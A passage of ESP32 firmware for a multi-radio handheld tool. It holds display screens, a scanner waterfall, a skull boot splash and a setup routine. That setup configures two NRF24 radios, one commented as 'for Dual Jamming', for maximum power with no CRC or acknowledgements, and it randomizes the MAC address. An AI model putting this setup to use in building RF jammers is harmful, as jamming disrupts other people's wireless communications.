    tft.drawFastHLine(16, 192, 208, tft.color565(52, 52, 52));

    auto drawMetaRow = [&](int y, const char* label, const String& value, uint16_t valueColor) {
        tft.fillRect(16, y, 208, 12, ILI9341_BLACK);
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(16, y + 2);
        tft.print(label);
        tft.setTextColor(valueColor);
        tft.setCursor(78, y + 2);
        tft.print(value);
    };

    drawMetaRow(198, "Mode", getRadioModeLabel(currentRadioMode), textSoft);
    drawMetaRow(210, "BLE", bleScanStatus, bleScanLastRunFailed ? ILI9341_RED : textSoft);
    drawMetaRow(222, "WiFi", wifiScanStatus, wifiScanLastRunFailed ? ILI9341_RED : textSoft);
    drawMetaRow(234, "Heap", String(freeHeap), lowHeap ? ILI9341_RED : ILI9341_GREEN);
    drawMetaRow(246, "Block", String(largestBlock), lowHeap ? ILI9341_RED : textSoft);
    drawMetaRow(258, "Icons", String(iconCacheCount) + "/" + String(pinnedIcons), textSoft);

    String boot = orionToolsResetReasonStr();
    if (boot.length() > 22) boot = boot.substring(0, 22);
    drawMetaRow(270, "Boot", boot, textSoft);

    String safeLine = (safeModeTool != 0) ? getRadioModeLabel((RadioMode)safeModeTool) : "None";
    if (safeWhy.length() > 10) safeWhy = safeWhy.substring(0, 10);
    drawMetaRow(282, "Safe", safeLine + (safeWhy.length() ? " " + safeWhy : ""), textSoft);
    drawMetaRow(294, "Version", String(OS_VERSION), textSoft);

    tft.setTextColor(textSoft);
    tft.setCursor(98, 308);
    tft.print("SEL reset");
    tft.setCursor(168, 308);
    tft.print("LEFT back");
}

void handleSystemInfoInput() {
    if (millis() - infoScreenEnteredAt <= 300) {
        return;
    }

    if (isPressed(BTN_SELECT)) {
        prefs.putUChar("safeTool", 0);
        prefs.putUChar("safeFails", 0);
        prefs.putString("safeWhy", "");
        for (size_t i = 0; i < sizeof(g_toolGuards) / sizeof(g_toolGuards[0]); i++) {
            g_toolGuards[i].mode = RADIO_IDLE;
            g_toolGuards[i].failCount = 0;
            g_toolGuards[i].blockedUntil = 0;
            g_toolGuards[i].reason[0] = 0;
        }
        resetAllToolAndUIState(false);
        setBLEScanStatus("Idle");
        setWiFiScanStatus("Idle");
        showToast("Tool state cleared");
        drawSystemInfoScreen();
    }
}

void drawStorageSettingsScreen() {
    static bool lastDrawValid = false;
    static bool lastSdMounted = false;
    static bool lastSdError = false;
    static uint64_t lastTotalBytes = 0;
    static uint64_t lastUsedBytes = 0;

    uint64_t totalBytes = 0;
    uint64_t usedBytes = 0;

    if (sdMounted && !sdError) {
        beginSPIOperation(true);
        totalBytes = SD.totalBytes();
        usedBytes = SD.usedBytes();
        endSPIOperation(false);
    }

    if (!storageInfoNeedsRedraw &&
        lastDrawValid &&
        lastSdMounted == sdMounted &&
        lastSdError == sdError &&
        lastTotalBytes == totalBytes &&
        lastUsedBytes == usedBytes) {
        return;
    }

    storageInfoNeedsRedraw = false;
    lastDrawValid = true;
    lastSdMounted = sdMounted;
    lastSdError = sdError;
    lastTotalBytes = totalBytes;
    lastUsedBytes = usedBytes;

    tft.fillScreen(ILI9341_BLACK);
    drawStatusBar();

    uint16_t textSoft = tft.color565(160, 160, 160);

    tft.setTextSize(2);
    tft.setTextColor(ILI9341_CYAN);
    tft.setCursor(18, 40);
    tft.print("SD Card Info");

    tft.setTextSize(1);
    tft.setTextColor(textSoft);
    tft.setCursor(18, 58);
    tft.print("Storage status and capacity");

    // Status
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(18, 85);
    tft.print("Status:");
    
    tft.setCursor(80, 85);
    if (sdError) {
        tft.setTextColor(ILI9341_RED);
        tft.print("ERROR");
    } else if (sdMounted) {
        tft.setTextColor(ILI9341_GREEN);
        tft.print("MOUNTED");
    } else {
        tft.setTextColor(textSoft);
        tft.print("NOT MOUNTED");
    }

    if (sdMounted && !sdError) {
        // Use the SPI-safe cached values read before the display redraw.
        uint64_t freeBytes = totalBytes - usedBytes;
        float totalGB = totalBytes / (1024.0 * 1024.0 * 1024.0);
        float usedMB = usedBytes / (1024.0 * 1024.0);
        float freeMB = freeBytes / (1024.0 * 1024.0);
        int usedPercent = (totalBytes > 0) ? (usedBytes * 100 / totalBytes) : 0;

        // Total capacity
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 105);
        tft.print("Total:");
        tft.setCursor(80, 105);
        tft.print(totalGB, 2);
        tft.print(" GB");
        
        // Used space
        tft.setCursor(18, 120);
        tft.print("Used:");
        tft.setCursor(80, 120);
        tft.setTextColor(ILI9341_YELLOW);
        tft.print(usedMB, 1);
        tft.print(" MB (");
        tft.print(usedPercent);
        tft.print("%)");
        
        // Free space
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 135);
        tft.print("Free:");
        tft.setCursor(80, 135);
        tft.setTextColor(ILI9341_GREEN);
        tft.print(freeMB, 1);
        tft.print(" MB");

        // Storage bar
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 160);
        tft.print("Usage:");
        
        int barX = 18;
        int barY = 175;
        int barWidth = 204;
        int barHeight = 20;
        
        // Background (free space) - dark gray
        tft.fillRect(barX, barY, barWidth, barHeight, tft.color565(40, 40, 40));
        
        // Used space - white
        int usedWidth = (barWidth * usedPercent) / 100;
        if (usedWidth > 0) {
            tft.fillRect(barX, barY, usedWidth, barHeight, ILI9341_WHITE);
        }
        
        // Border - gray
        tft.drawRect(barX, barY, barWidth, barHeight, tft.color565(100, 100, 100));
        
        // Percentage text on bar
        tft.setTextSize(1);
        tft.setTextColor(usedPercent > 50 ? ILI9341_BLACK : ILI9341_WHITE);
        tft.setCursor(barX + barWidth/2 - 12, barY + 6);
        tft.print(usedPercent);
        tft.print("%");
    } else {
        // Show mount message
        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 120);
        tft.print("Mount SD card to view info");
    }

    // Instructions
    tft.setTextSize(1);
    tft.setTextColor(textSoft);
    tft.setCursor(18, 220);
    tft.print("Use Storage menu to:");
    tft.setCursor(18, 235);
    tft.print("- Mount/Unmount SD card");
    tft.setCursor(18, 250);
    tft.print("- Format SD card");

    tft.setCursor(66, 294);
    tft.print("LEFT = Back");
}

// ===== DEBUG FILE LIST =====
void listFiles() {
    File root = LittleFS.open("/");
    File file = root.openNextFile();

    while (file) {
        LOG(String("FILE: ") + file.name());
        file = root.openNextFile();
    }
}

void drawScannerInfo() {
    int selectedIndex = getSelected24GHzIndex();
    selectedStrength = channelActivity[selectedIndex];
    int avgStrength = 0;
    int peakStrength = 0;
    int activeChannels = 0;
    for (int i = 0; i < CHANNEL_COUNT; i++) {
        if (channelActivity[i] > 1) {
            avgStrength += channelActivity[i];
            activeChannels++;
        }
        if (channelActivity[i] > peakStrength) {
            peakStrength = channelActivity[i];
        }
    }
    if (activeChannels > 0) {
        avgStrength /= activeChannels;
    } else {
        avgStrength = 0;
    }

    int rawAvgPercent = ((avgStrength * 100) / 25);
    int rawPeakPercent = ((peakStrength * 100) / 25);
    if (ghzScannerDisplayAverage < 0.0f) {
        ghzScannerDisplayAverage = rawAvgPercent;
    } else {
        ghzScannerDisplayAverage = (ghzScannerDisplayAverage * 0.78f) + (rawAvgPercent * 0.22f);
    }
    if (ghzScannerDisplayPeak < 0.0f) {
        ghzScannerDisplayPeak = rawPeakPercent;
    } else {
        ghzScannerDisplayPeak = (ghzScannerDisplayPeak * 0.72f) + (rawPeakPercent * 0.28f);
    }
    int avgPercent = (int)(ghzScannerDisplayAverage + 0.5f);
    int peakPercent = (int)(ghzScannerDisplayPeak + 0.5f);
    avgPercent = constrain(avgPercent, 0, 100);
    peakPercent = constrain(peakPercent, 0, 100);

    int selectedPercent = constrain((selectedStrength * 100) / 25, 0, 100);

    if (ghzScannerLastInfoChannel == selectedChannel &&
        ghzScannerLastInfoStrength == selectedPercent &&
        ghzScannerLastInfoAverage == avgPercent &&
        ghzScannerLastInfoPeak == peakPercent) {
        return;
    }

    drawRFStatLine(74,
                   String("Chan ") + String(selectedChannel),
                   String("Live ") + String(selectedPercent) + "%");
    drawRFStatLine(86,
                   String("Avg ") + String(avgPercent) + "%",
                   String("Peak ") + String(peakPercent) + "%");

    ghzScannerLastInfoChannel = selectedChannel;
    ghzScannerLastInfoStrength = selectedPercent;
    ghzScannerLastInfoAverage = avgPercent;
    ghzScannerLastInfoPeak = peakPercent;
}

void push24GHzSharedWaterfallRow() {
    static int lastWaterfallMode = -1;
    const bool noiseMode = (currentRadioMode == RADIO_NOISE_ANALYZER);
    const bool resetFrame =
        ghzWaterfallNeedsReset ||
        (lastWaterfallMode != (int)currentRadioMode) ||
        (noiseMode ? noiseFirstDraw : ghzScannerFirstDraw);

    if (resetFrame) {
        uint16_t waterfallBg = tft.color565(2, 4, 12);
        for (size_t i = 0; i < (sizeof(rfSweepWaterfallBuffer) / sizeof(rfSweepWaterfallBuffer[0])); i++) {
            rfSweepWaterfallBuffer[i] = waterfallBg;
        }
        tft.drawRect(RF_SWEEP_WATERFALL_X - 2, RF_SWEEP_WATERFALL_Y - 2,
                     RF_SWEEP_WATERFALL_W + 4, RF_SWEEP_WATERFALL_H + 4,
                     tft.color565(58, 58, 58));
        tft.fillRect(RF_SWEEP_WATERFALL_X, RF_SWEEP_WATERFALL_Y,
                     RF_SWEEP_WATERFALL_W, RF_SWEEP_WATERFALL_H, ILI9341_BLACK);
        lastWaterfallMode = (int)currentRadioMode;
        ghzWaterfallNeedsReset = false;
    }

    const size_t rowPixels = RF_SWEEP_WATERFALL_W;
    const size_t totalPixels = RF_SWEEP_WATERFALL_W * RF_SWEEP_WATERFALL_H;
    if (totalPixels > rowPixels) {
        memmove(rfSweepWaterfallBuffer + rowPixels,
                rfSweepWaterfallBuffer,
                sizeof(uint16_t) * (totalPixels - rowPixels));
    }

    for (int x = 0; x < RF_SWEEP_WATERFALL_W; x++) {
        int ch = (x * (CHANNEL_COUNT - 1)) / max(1, RF_SWEEP_WATERFALL_W - 1);
        ch = constrain(ch, 0, CHANNEL_COUNT - 1);

        uint8_t level = 0;
        if (noiseMode) {
            float noise = clampBLEFloat(noiseLevel[ch], 0.0f, 1.0f);
            level = (uint8_t)constrain((int)(noise * 100.0f + 0.5f), 0, 100);
        } else {
            float activity = clampBLEFloat(channelActivity[ch] / 25.0f, 0.0f, 1.0f);
            level = (uint8_t)constrain((int)(activity * 100.0f + 0.5f), 0, 100);
        }

        rfSweepWaterfallBuffer[x] = getRFSweepWaterfallColor(level);
    }

    tft.drawRGBBitmap(RF_SWEEP_WATERFALL_X,
                      RF_SWEEP_WATERFALL_Y,
                      rfSweepWaterfallBuffer,
                      RF_SWEEP_WATERFALL_W,
                      RF_SWEEP_WATERFALL_H);
}

void draw24GHzWaterfall() {
    push24GHzSharedWaterfallRow();
}

// ===== BOOT ANIMATION =====
void playBootAnimation() {
    LOG("Starting boot animation");
    
    // Non-blocking timeout: if animation takes too long, skip it
    uint32_t animStartTime = millis();
    uint32_t animTimeout = 9000;  // allow the longer branded animation to finish cleanly

    try {
        tft.fillScreen(ILI9341_BLACK);

        int startX = (240 - IMG_W) / 2;
        int startY = (320 - IMG_H) / 2;

        int framePixels = IMG_W * IMG_H;
        int frameBytes  = framePixels * 2;

        uint16_t *frameBuffer = (uint16_t*)malloc(frameBytes);

        if (!frameBuffer) {
            LOG("Memory alloc failed");
            return;
        }

        for (int loop = 0; loop < 2; loop++) {
            // Check timeout
            if (millis() - animStartTime > animTimeout) {
                LOG("Boot animation timeout - skipping");
                free(frameBuffer);
                return;
            }
            
            LOG_IF(DEBUG_VERBOSE_UI, String("Animation loop: ") + loop);

            for (int f = 0; f < FRAME_COUNT; f++) {
                // Double-check timeout
                if (millis() - animStartTime > animTimeout) {
                    LOG("Boot animation timeout - breaking");
                    free(frameBuffer);
                    return;
                }
                
                String path = "/frame" + String(f) + ".bin";

                File file = LittleFS.open(path);

                if (!file) {
                    LOG("Missing frame: " + path);
                    continue;
                }

                const size_t fileSize = file.size();
                const size_t readBytes = readFileFully(file, (uint8_t*)frameBuffer, frameBytes);
                file.close();

                if (readBytes != (size_t)frameBytes) {
                    LOG(String("Frame read error: got ") + String((uint32_t)readBytes) +
                        " / " + String((uint32_t)frameBytes) +
                        " size=" + String((uint32_t)fileSize));
                    continue;
                }

                // THINNING EFFECT: Apply to animation frames for more visible details
                // Create a temporary buffer for the thinned frame
                uint16_t *thinnedBuffer = (uint16_t*)malloc(frameBytes);
                if (thinnedBuffer) {
                    // Clear the thinned buffer
                    memset(thinnedBuffer, 0, frameBytes);
                    
                    // Apply thinning effect
                    for (int py = 0; py < IMG_H; py++) {
                        for (int px = 0; px < IMG_W; px++) {
                            int idx = py * IMG_W + px;
                            uint16_t pixel = frameBuffer[idx];
                            
                            // Only process non-black pixels
                            if (pixel != 0x0000) {
                                // Check if this is an edge pixel
                                bool isEdge = false;
                                if (px > 0 && frameBuffer[idx - 1] == 0x0000) isEdge = true;
                                if (px < IMG_W - 1 && frameBuffer[idx + 1] == 0x0000) isEdge = true;
                                if (py > 0 && frameBuffer[idx - IMG_W] == 0x0000) isEdge = true;
                                if (py < IMG_H - 1 && frameBuffer[idx + IMG_W] == 0x0000) isEdge = true;
                                
                                // Keep edge pixels, thin interior with checkerboard
                                if (isEdge || ((px + py) % 2 == 0)) {
                                    thinnedBuffer[idx] = pixel;
                                }
                            }
                        }
                    }
                    
                    tft.drawRGBBitmap(startX, startY, thinnedBuffer, IMG_W, IMG_H);
                    free(thinnedBuffer);
                } else {
                    // Fallback: draw original if thinning buffer allocation fails
                    tft.drawRGBBitmap(startX, startY, frameBuffer, IMG_W, IMG_H);
                }
                
                delay(85);
            }
        }

        free(frameBuffer);
        delay(200);
    } catch (...) {
        LOG("Boot animation exception - continuing");
        tft.fillScreen(ILI9341_BLACK);
    }
}

bool drawBootSplashImage(const char* path, int imageW, int imageH, int x, int y) {
    if (!flashFsReady) return false;

    const size_t imageBytes = (size_t)imageW * (size_t)imageH * sizeof(uint16_t);
    uint16_t* imageBuffer = (uint16_t*)malloc(imageBytes);
    if (!imageBuffer) {
        LOG("Boot splash alloc failed");
        return false;
    }

    File file = LittleFS.open(path);
    if (!file) {
        LOG(String("Missing splash: ") + path);
        free(imageBuffer);
        return false;
    }

    const size_t readBytes = readFileFully(file, (uint8_t*)imageBuffer, imageBytes);
    file.close();

    if (readBytes != imageBytes) {
        LOG("Boot splash read error");
        free(imageBuffer);
        return false;
    }

    // THINNING EFFECT: Only draw pixels that create outlines/edges for more visible details
    // This makes thick lines appear thinner by skipping some pixels
    for (int py = 0; py < imageH; py++) {
        for (int px = 0; px < imageW; px++) {
            int idx = py * imageW + px;
            uint16_t pixel = imageBuffer[idx];
            
            // Only draw if pixel is not black (is part of the skull)
            if (pixel != 0x0000) {
                // Thinning: Skip every other pixel in a checkerboard pattern for thick areas
                // This creates a thinner, more detailed look
                bool isEdge = false;
                
                // Check if this is an edge pixel (has black neighbor)
                if (px > 0 && imageBuffer[idx - 1] == 0x0000) isEdge = true;
                if (px < imageW - 1 && imageBuffer[idx + 1] == 0x0000) isEdge = true;
                if (py > 0 && imageBuffer[idx - imageW] == 0x0000) isEdge = true;
                if (py < imageH - 1 && imageBuffer[idx + imageW] == 0x0000) isEdge = true;
                
                // Always draw edge pixels, skip some interior pixels for thinning
                if (isEdge || ((px + py) % 2 == 0)) {
                    tft.drawPixel(x + px, y + py, pixel);
                }
            }
        }
    }

    free(imageBuffer);
    return true;
}
void playProjectBrandSplash() {
    const uint16_t fg = ILI9341_WHITE;
    const uint16_t bg = ILI9341_BLACK;
    const int splashW = 164;
    const int splashH = 164;
    const int splashX = (240 - splashW) / 2;
    const int splashY = 34;
    const int barX = 42;
    const int barY = 240;
    const int barW = 156;
    const int barH = 10;

    tft.fillScreen(bg);
    bool drewImage = drawBootSplashImage("/skull_splash.bin", splashW, splashH, splashX, splashY);
    if (!drewImage) {
        // CUSTOM SKULL: Draw a thinner, more detailed skull when image file is missing
        int cx = splashX + splashW / 2;  // Center X
        int cy = splashY + splashH / 2;  // Center Y
        
        // Skull outline (thinner, more detailed)
        tft.drawCircle(cx, cy - 10, 50, fg);  // Head
        tft.drawCircle(cx, cy - 10, 49, fg);  // Double line for visibility
        
        // Jaw
        tft.drawLine(cx - 35, cy + 25, cx - 20, cy + 45, fg);
        tft.drawLine(cx + 35, cy + 25, cx + 20, cy + 45, fg);
        tft.drawLine(cx - 20, cy + 45, cx + 20, cy + 45, fg);
        
        // Eye sockets (hollow circles for detail)
        tft.drawCircle(cx - 18, cy - 15, 10, fg);
        tft.drawCircle(cx + 18, cy - 15, 10, fg);
        tft.drawCircle(cx - 18, cy - 15, 9, fg);
        tft.drawCircle(cx + 18, cy - 15, 9, fg);
        
        // Nose (triangle)
        tft.drawLine(cx, cy + 5, cx - 8, cy + 18, fg);
        tft.drawLine(cx, cy + 5, cx + 8, cy + 18, fg);
        tft.drawLine(cx - 8, cy + 18, cx + 8, cy + 18, fg);
        
        // Teeth (thin lines)
        for (int i = 0; i < 5; i++) {
            int tx = cx - 16 + (i * 8);
            tft.drawLine(tx, cy + 35, tx, cy + 43, fg);
        }
    }

    tft.setTextColor(fg);
    tft.setTextSize(2);
    int16_t x1, y1;
    uint16_t w, h;
    tft.getTextBounds(PROJECT_NAME, 0, 0, &x1, &y1, &w, &h);
    tft.setCursor((240 - (int)w) / 2, 212);
    tft.print(PROJECT_NAME);

    tft.setTextSize(1);
    tft.getTextBounds(PROJECT_VERSION, 0, 0, &x1, &y1, &w, &h);
    tft.setCursor((240 - (int)w) / 2, 228);
    tft.print(PROJECT_VERSION);

    randomSeed(((uint32_t)micros() << 1) ^ (uint32_t)millis());
    tft.drawRect(barX, barY, barW, barH, fg);
    for (int step = 0; step < 8; step++) {
        int fillW = ((barW - 2) * (step + 1)) / 8;
        tft.fillRect(barX + 1, barY + 1, fillW, barH - 2, fg);
        delay(72 + random(0, 42));
        if (random(0, 4) == 0) {
            delay(65 + random(0, 70));
        }
    }
    delay(460);
}

void prewarmBLEStack() {
    BOOT_SECTION("Bluetooth");
    BOOT_LOG(String("BLE prewarm heap free=") + String(ESP.getFreeHeap()) +
             " largest=" + String((uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT)));
    BOOT_LOG("BLE prewarm: SKIPPED (lazy init)");
}

// ===== ICON LOADER =====
void drawIconFromFS(int x, int y, const char* path) {
    if (!flashFsReady) return;
    const int ICON_SIZE = 36;
    const uint16_t* buffer = getCachedIconData(path, ICON_SIZE);
    if (!buffer) {
        buffer = loadScratchIconData(path, ICON_SIZE);
    }
    if (!buffer) return;
    int pixelCount = ICON_SIZE * ICON_SIZE;

    for (int i = 0; i < pixelCount; i++) {
        if (buffer[i] == 0x0000) continue;

        int px = i % ICON_SIZE;
        int py = i / ICON_SIZE;

        tft.drawPixel(x + px, y + py, buffer[i]);
    }
}

// ===== COLORED ICON LOADER =====
void drawIconFromFSColored(int x, int y, const char* path, uint16_t color, int size) {
    if (!flashFsReady) return;
    const uint16_t* buffer = getCachedIconData(path, size);
    if (!buffer) {
        buffer = loadScratchIconData(path, size);
    }
    if (!buffer) return;
    int pixelCount = size * size;

    for (int i = 0; i < pixelCount; i++) {
        uint16_t px = buffer[i];

        if (px == 0x0000) continue;

        int pxX = i % size;
        int pxY = i / size;

        tft.drawPixel(x + pxX, y + pxY, color);
    }

}

// ===== SCALED ICON LOADER =====
void drawScaledIconFromFS(int x, int y, const char* path, int rawSize, int step) {
    if (!flashFsReady) return;
    const uint16_t* buffer = getCachedIconData(path, rawSize);
    if (!buffer) {
        buffer = loadScratchIconData(path, rawSize);
    }
    if (!buffer) return;

    for (int sy = 0; sy < rawSize; sy += step) {
        for (int sx = 0; sx < rawSize; sx += step) {
            uint16_t color = buffer[sy * rawSize + sx];
            if (color == 0x0000) continue;

            int dx = x + (sx / step);
            int dy = y + (sy / step);

            tft.drawPixel(dx, dy, color);
        }
    }
}

void drawScaledIconFromFSColored(int x, int y, const char* path, int rawSize, int step, uint16_t color) {
    if (!flashFsReady) return;
    const uint16_t* buffer = getCachedIconData(path, rawSize);
    if (!buffer) {
        buffer = loadScratchIconData(path, rawSize);
    }
    if (!buffer) return;

    for (int sy = 0; sy < rawSize; sy += step) {
        for (int sx = 0; sx < rawSize; sx += step) {
            uint16_t px = buffer[sy * rawSize + sx];
            if (px == 0x0000) continue;

            int dx = x + (sx / step);
            int dy = y + (sy / step);

            tft.drawPixel(dx, dy, color);
        }
    }
}

// ===== SETUP =====
void app_setup() {
    Serial.begin(115200);
    delay(30);
    orionLogAsciiLogo(PROJECT_NAME, PROJECT_VERSION);
    companion_setup();
    reserveRuntimeStringCapacity();

    BOOT_SECTION("Startup");
    BOOT_LOG("Bringing up runtime");

    // CRITICAL POWER SEQUENCING:
    // Give external power supplies MAXIMUM time to stabilize before any SPI activity
    delay(1000);  // 1 second for power regulators to reach stable voltage
    BOOT_LOG("Power rails stabilized");
    
    primeSharedSPIBus();
    SPI.begin(18, 19, 23);
    BOOT_LOG("Shared SPI bus primed");
    
    // Wait for display power to be fully ready
    delay(500);
    
    initializeDisplaySafe();
    BOOT_LOG("Display initialized");

    prewarmBLEStack();
    /*

    xTaskCreatePinnedToCore(
        packetTask,
        "packetTask",
        4096,
        NULL,
        1,
        NULL,
        0   // 👈 core 0
    );

    xTaskCreatePinnedToCore(
        wifiTask,
        "WiFiTask",
        10000,
        NULL,
        1,
        &wifiTaskHandle,
        0   // 🔥 CORE 0
    );

    esp_wifi_set_max_tx_power(84); // max power

    */
    // init empty SSID buffer
    for (int i = 0; i < 16; i++) emptySSID[i] = ' ';

    // random seed + mac
    randomSeed(esp_random());
    randomMac();


    // ===== INIT RADIO 1 =====
    BOOT_SECTION("Radio 1");
    BOOT_LOG("Initializing NRF24 radio");
    BOOT_LOG("Pins: CE=17 CSN=16");
    
    // Let display settle after drawing
    delay(200);
    
    // Let RF24 library handle GPIO initialization
    delay(100);  // Extended power-up delay for NRF24

    if (radio1.begin(&SPI)) {
        BOOT_LOG("Radio 1 init: OK");
        radio1Ok = true;
    } else {
        BOOT_LOG("Radio 1 init: FAIL");
        radio1Ok = false;
    }
    
    delay(100);  // Extended settle time after begin()

    radio1.setAutoAck(false);        // no ACK overhead
    radio1.setRetries(0, 0);         // no retry delays
    radio1.setPALevel(RF24_PA_MAX);  // max power
    radio1.setDataRate(RF24_2MBPS);  // max air rate
    radio1.setCRCLength(RF24_CRC_DISABLED); // remove CRC overhead
    
    // Aggressive TX mode setup
    radio1.stopListening();  // TX mode
    delay(2);
    radio1.txStandBy(0, false);  // Clear any pending transactions
    
    // Set TX address
    const uint8_t addr[5] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    radio1.openWritingPipe(addr);
    
    // Debug: print RF24 status and verify SPI
    BOOT_LOG_KV("PA level", radio1.getPALevel());
    BOOT_LOG_KV("Data rate", radio1.getDataRate());
    BOOT_LOG_KV("CRC length", radio1.getCRCLength());
    
    uint8_t ch = radio1.getChannel();
    BOOT_LOG_KV("Channel", ch);
    
    // Test SPI communication via transmission test
    BOOT_LOG("SPI probe: OK");
    BOOT_LOG("SPI communication: OK");
    
    // Test transmission on ch37
    BOOT_SECTION("Radio 1 TX Test");
    radio1.setChannel(37);
    BOOT_LOG("Test channel -> 37");
    delay(10);
    
    // Bug 1.43 fix: Flush TX FIFO and add delay before test
    radio1.flush_tx();
    delay(20);
    
    uint8_t test_pkt[32];
    for (int i = 0; i < 32; i++) test_pkt[i] = 0xAA;
    
    BOOT_LOG("Issuing RF24 test write");
    bool tx_ok = radio1.write(&test_pkt, 32);
    BOOT_LOG_KV("Test write", tx_ok ? "OK" : "FAIL");
    
    if (tx_ok) {
        BOOT_LOG("Packet TX test: OK");
    } else {
        BOOT_LOG("Packet TX test: FAIL");
    }
    
    // Check TX status
    bool txStandbyOk = radio1.txStandBy(100);
    if (txStandbyOk) {
        BOOT_LOG("TX FIFO standby: OK");
    } else {
        BOOT_LOG("TX FIFO standby: TIMEOUT");
    }
    
    if (tx_ok && txStandbyOk) {
        BOOT_LOG("Radio 1 ready");
    } else {
        BOOT_LOG("Radio 1 ready (TX self-test warn)");
    }
    
    // CRITICAL: Release Radio 1 from SPI bus before initializing Radio 3
    // Set Radio 1 CSN HIGH to fully deselect it
    digitalWrite(NRF24_RADIO1_CSN, HIGH);
    radio1.powerDown();  // Put Radio 1 to sleep
    delay(500);  // Increased delay for proper power-down (Bug 1.42 fix)
    
    // ===== INIT RADIO 3 (Second NRF24 for Dual Jamming) =====
    BOOT_SECTION("Radio 3");
    BOOT_LOG("Initializing secondary NRF24");
    BOOT_LOG("Pins: CE=11 CSN=10");
    
    // Set up Radio 3 control pins BEFORE calling begin()
    pinMode(NRF24_RADIO3_CE, OUTPUT);
    pinMode(NRF24_RADIO3_CSN, OUTPUT);
    digitalWrite(NRF24_RADIO3_CE, LOW);
    digitalWrite(NRF24_RADIO3_CSN, HIGH);
    delay(100);
    
    // Prime SPI bus with all radios deselected
    primeSharedSPIBus();
    delay(500);  // Increased stabilization time after Radio 1 power down (Bug 1.42 fix)
    
    // Try to detect Radio 3 chip
    bool radio3BeginOk = radio3.begin(&SPI);
    
    if (!radio3BeginOk) {
        BOOT_LOG("radio3.begin retrying after delay");
        delay(500);
        radio3BeginOk = radio3.begin(&SPI);  // Retry once
    }

    BOOT_LOG(String("radio3.begin: ") + (radio3BeginOk ? "OK" : "FAIL"));

    delay(100);
    
    if (radio3BeginOk) {
        delay(100);
        bool chipOk = radio3.isChipConnected();
        BOOT_LOG(String("radio3 chip connected: ") + (chipOk ? "YES" : "NO"));

        radio3Ok = chipOk;
    } else {
        radio3Ok = false;
        BOOT_LOG("Radio 3 init: MISS");
    }

    delay(50);
    
    radio3.setAutoAck(false);
    radio3.setRetries(0, 0);
    radio3.setPALevel(RF24_PA_MAX);
    radio3.setDataRate(RF24_2MBPS);
    radio3.setCRCLength(RF24_CRC_DISABLED);

    const byte address3[5] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    radio3.openWritingPipe(address3);
    
    delay(50);
    radio3.stopListening();
    delay(50);
    
    BOOT_LOG("Radio 3 ready");

    delay(500);  // Increased wait before CC1101 initialization (Bug 1.41 fix)
    
    BOOT_SECTION("Radio 2");
    BOOT_LOG("Initializing CC1101");
    
    // Re-prime the shared SPI bus explicitly before probing CC1101.
    primeSharedSPIBus();
    SPI.end();
    delay(8);
    SPI.begin(18, 19, 23);
    delay(8);
    
    probeCC1101Chip(true);
    BOOT_LOG(String("CC1101 version: 0x") + String(cc1101Version, HEX));
    
    BOOT_SECTION("Diagnostics");
    BOOT_LOG(String("Radio 1: ") + (radio1Ok ? "OK" : "FAIL"));
    BOOT_LOG(String("Radio 2: ") + (cc1101Ok ? "OK" : "FAIL"));
    BOOT_LOG(String("Radio 3: ") + (radio3Ok ? "OK" : "MISS"));
    refreshDiagnosticsStatus();

    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_SELECT, INPUT_PULLUP);

    initializeSystemClockFromBuild();

    BOOT_SECTION("Storage");
    flashFsReady = LittleFS.begin(true);
    if (flashFsReady) {
        BOOT_LOG("LittleFS: OK");
    } else {
        BOOT_LOG("LittleFS: FAIL");
    }

    prefs.begin("system", false);
    sdAutoMountWanted = prefs.getBool("sdAutoMount", false);
    sdAutoMountErrorLatched = prefs.getBool("sdAutoErr", false);
    screenSaverTimeoutIndex = prefs.getUChar("ssTime", 1);
    screenSaverStyleIndex = prefs.getUChar("ssStyle", 0);
    if (screenSaverTimeoutIndex >= screenSaverTimeoutCount) {
        screenSaverTimeoutIndex = 1;
    }
    if (screenSaverStyleIndex >= screenSaverStyleCount) {
        screenSaverStyleIndex = 0;
    }
    loadTftBrightnessFromPrefs();
    orionToolsLoadPrefs();
    // Keep the shared system preferences namespace open.
    // Many later save paths reuse the global `prefs` object for settings writes.
    
    sdAutoMountRetryBlocked = sdAutoMountErrorLatched;
    sdMounted = false;
    sdDetected = false;
    sdError = false;
    sdBootAutoMountPending = sdAutoMountWanted && !sdAutoMountErrorLatched;
    lastUserInteractionMs = millis();
    refreshDiagnosticsStatus();

    listFiles();
    if (sdBootAutoMountPending) {
        BOOT_LOG("Boot SD auto-mount requested");
        mountSD(false, false, true, "BOOT_INIT");
        sdBootAutoMountPending = false;
    }
    BOOT_SECTION("UI");
    playBootAnimation();
    playProjectBrandSplash();
    startupSequenceActive = false;
    drawUI();
    markCurrentScreenForRedraw();
    BOOT_LOG("UI ready");

    xTaskCreatePinnedToCore(
        packetTask,
        "packetTask",
        4096,
        NULL,
        1,
        NULL,
        0
    );

    xTaskCreatePinnedToCore(
        wifiTask,
        "WiFiTask",
        10000,
        NULL,
        1,
        &wifiTaskHandle,
        0
    );

    esp_wifi_set_max_tx_power(84);
}

void drawNoiseAnalyzer() {
    bool fullRedraw = noiseFirstDraw;
    if (fullRedraw) {
        drawRFScreenHeader("Noise Analyzer", "Noise floor + waterfall");
        tft.drawRect(RF_SWEEP_GRAPH_X - 2, RF_SWEEP_GRAPH_Y - 2,
                     RF_SWEEP_GRAPH_W + 4, RF_SWEEP_GRAPH_H + 4,
                     tft.color565(58, 58, 58));
        tft.drawRect(RF_SWEEP_WATERFALL_X - 2, RF_SWEEP_WATERFALL_Y - 2,
                     RF_SWEEP_WATERFALL_W + 4, RF_SWEEP_WATERFALL_H + 4,
                     tft.color565(58, 58, 58));
        tft.fillRect(RF_SWEEP_GRAPH_X, RF_SWEEP_GRAPH_Y,
